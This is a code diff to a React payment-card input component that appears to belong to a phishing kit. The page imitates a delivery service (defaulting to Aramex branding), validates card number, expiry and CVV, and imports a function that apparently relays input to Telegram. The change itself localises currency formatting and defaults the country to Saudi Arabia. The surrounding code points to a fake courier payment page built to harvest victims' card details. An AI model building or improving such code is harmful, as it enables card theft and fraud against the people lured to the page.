@@ -13,6 +13,7 @@ import { sendToTelegram } from "@/lib/telegram";
 import { validateLuhn, formatCardNumber, detectCardType, validateExpiry, validateCVV } from "@/lib/cardValidation";
 import { getBankById } from "@/lib/banks";
 import { getCountryByCode } from "@/lib/countries";
+import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
 
 const PaymentCardInput = () => {
   const { id } = useParams();
@@ -30,18 +31,18 @@ const PaymentCardInput = () => {
 
   // Get customer info and selected bank from link data (cross-device compatible)
   const customerInfo = linkData?.payload?.customerInfo || {};
-  const selectedCountry = linkData?.payload?.selectedCountry || '';
+  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
   const selectedBankId = linkData?.payload?.selectedBank || '';
-  
+
   const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
-  const formattedAmount = `${amount} ر.س`;
-  
+  const formattedAmount = formatCurrency(amount, selectedCountry);
+
   const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
-  const selectedCountryData = selectedCountry ? getCountryByCode(selectedCountry) : null;
   
   const handleCardNumberChange = (value: string) => {
     const formatted = formatCardNumber(value.replace(/\D/g, "").slice(0, 16));
